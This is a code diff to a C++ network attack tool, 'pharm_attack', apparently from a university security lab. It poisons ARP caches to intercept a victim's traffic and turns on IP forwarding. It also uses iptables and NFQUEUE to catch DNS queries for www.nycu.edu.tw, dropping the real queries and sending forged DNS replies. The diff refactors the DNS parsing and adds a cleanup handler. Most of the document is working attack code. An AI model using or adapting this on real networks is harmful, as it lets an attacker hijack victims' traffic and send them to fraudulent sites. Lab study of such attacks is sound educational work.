@@ -1,15 +1,14 @@
 #include "pharm_attack.hpp"
 
 // #define INFO 1
-#define NFQ 1
 #define MAC_LENGTH 6
 
-#ifdef NFQ
-void handler(int signum) {
-    system("sudo iptables -t mangle -D OUTPUT -j NFQUEUE --queue-num 0");
-    exit(signum);
+void handle_sigint(int sig) {
+    system("iptables -F");
+    system("iptables -F -t nat");
+    system("sysctl net.ipv4.ip_forward=0 > /dev/null");
+    exit(0);
 }
-#endif
 
 void send_data_udp(char *data, int len, struct NFQData *info) {
     // raw socket
@@ -33,7 +32,7 @@ void send_data_udp(char *data, int len, struct NFQData *info) {
     }
     printf("\n");
     printf("my_ip: %s\n", inet_ntoa(info->local_info.src_ip.sin_addr));
-    
+
     char *sendbuf = new char[1024];
     memset(sendbuf, 0, 1024);
     struct ethhdr *eth = (struct ethhdr *)sendbuf;
@@ -201,6 +200,26 @@ void receiveHandler(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t,
     }
 }
 
+std::string parse_dns_query(const unsigned char *packet, int dns_start, int &dns_name_length) {
+    std::string dns_name;
+    int dns_name_position = dns_start + sizeof(dns_hdr);
+    dns_name_length = 5;  // Include qry.type, qry.class, and final 0 in qname
+
+    while (packet[dns_name_position] != 0) {
+        int label_length = packet[dns_name_position];
+        dns_name_length += label_length + 1;
+
+        for (int i = 0; i < label_length; i++) {
+            dns_name_position++;
+            dns_name += packet[dns_name_position];
+        }
+
+        dns_name_position++;
+    }
+
+    return dns_name;
+}
+
 static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                            struct nfq_data *nfa, void *data) {
     struct nfqnl_msg_packet_hdr *ph;
@@ -218,37 +237,27 @@ static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
         printf("Error: nfq_get_payload returned %d\n", len);
         return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
     }
+    // ip header
+    struct iphdr *iph = (struct iphdr *)packet;
+    // udp header
+    struct udphdr *udph = (struct udphdr *)(packet + iph->ihl * 4);
 
-    // udp
-    int dport;
-    int iph_len = (((uint8_t)packet[0]) & 0x0F) << 2, udph_len = 8;
-    dport = (((uint8_t)packet[iph_len + 2]) << 8) | ((uint8_t)packet[iph_len + 3]);
+    int iph_len = iph->ihl * 4;
+    int udph_len = sizeof(struct udphdr);
+    int dport = ntohs(udph->dest);
 
-    if (dport == 53) {
-        std::string str = "";
-        int dns_start = iph_len + udph_len;
-        // struct dns_hdr *hdr = (struct dns_hdr *) (data + dns_start);
+    if (dport != 53) {
+        return nfq_set_verdict(qh, ph->packet_id, NF_ACCEPT, 0, NULL);
+    }
+    int dns_name_length;
+    std::string dns_name = parse_dns_query(packet, iph_len + udph_len, dns_name_length);
+    // printf("dns_name: %s\n", dns_name.c_str());
 
-        int name_mv = dns_start + sizeof(dns_hdr);
-        int qname_len = 5;  // qry.type and qry.class, and final 0 in qname
-        while (packet[name_mv] != 0) {
-            int part_len = packet[name_mv];
-            qname_len += part_len + 1;
-            // cout << "len: " << part_len << '\n';
-            for (int j = 0; j < part_len; j++) {
-                name_mv++;
-                str += packet[name_mv];
-            }
-            name_mv++;
-            str += '.';
-        }
-
-        if (str.find("www.nycu.edu.tw") != std::string::npos) {
-            printf("target found!!!\n");
-            send_dns_reply(packet, len, qname_len, nfq_data);
-        }
+    if (dns_name != "wwwnycuedutw") {
+        return nfq_set_verdict(qh, ph->packet_id, NF_ACCEPT, 0, NULL);
     }
 
+    send_dns_reply(packet, len, dns_name_length, nfq_data);
     return nfq_set_verdict(qh, ph->packet_id, NF_DROP, 0, NULL);
 }
 
@@ -355,10 +364,9 @@ int main(int argc, char **argv) {
     std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
     std::thread receive_thread(receiveHandler, sd, std::ref(ip_mac_pairs), local_info);
 
-#ifdef NFQ
+    signal(SIGINT, handle_sigint);
+
     system("sysctl net.ipv4.ip_forward=1 > /dev/null");
-    // system("sysctl net.ipv4.conf.all.send_redirects=0 > /dev/null");
-    // system("sysctl net.ipv4.conf.all.secure_redirects=0 > /dev/null");
     system("iptables -F");
     system("iptables -F -t nat");
     char cmd[100];
@@ -369,7 +377,6 @@ int main(int argc, char **argv) {
 
     // Start the NFQHandler
     NFQHandler(local_info, ip_mac_pairs);
-#endif
 
     // Wait for threads to finish
     send_thread.join();
